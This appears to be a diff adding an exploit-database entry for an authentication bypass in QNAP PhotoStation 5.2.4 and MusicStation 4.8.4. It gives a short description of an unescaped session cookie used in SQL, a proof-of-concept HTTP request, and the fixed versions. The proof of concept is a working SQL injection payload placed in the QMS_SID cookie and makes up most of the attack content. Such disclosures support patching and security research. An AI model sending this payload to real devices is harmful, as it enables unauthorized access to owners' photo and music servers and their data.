@@ -1,0 +1,29 @@
+# Exploit QNAP PhotoStation 5.2.4 and MusicStation 4.8.4 Authentication Bypass
+# Date: 10.05.2017
+# Software Link: https://www.qnap.com
+# Exploit Author: Kacper Szurek
+# Contact: https://twitter.com/KacperSzurek
+# Website: https://security.szurek.pl/
+# Category: web
+  
+1. Description
+ 
+`$_COOKIE[STATIONSID]` is not escaped and then used inside SQL statement.
+
+https://security.szurek.pl/qnap-photostation-524-musicstation-484-authentication-bypass.html
+
+2. Proof of Concept
+
+GET /photo/api/dmc.php HTTP/1.1
+Host: qnap.host:8080
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: pl-PL,pl;q=0.8,en-US;q=0.6,en;q=0.4
+Cookie: QMS_SID=' UNION SELECT 9999999999,9999999999,9999999999,9999999999,9999999999,9999999999,9999999999,9999999999,9999999999 -- a
+Connection: close
+
+3. Fix
+
+Upgrade to version: Photo Station (5.3.4 / 5.2.5), Music Station (5.0.4 / 4.8.5)
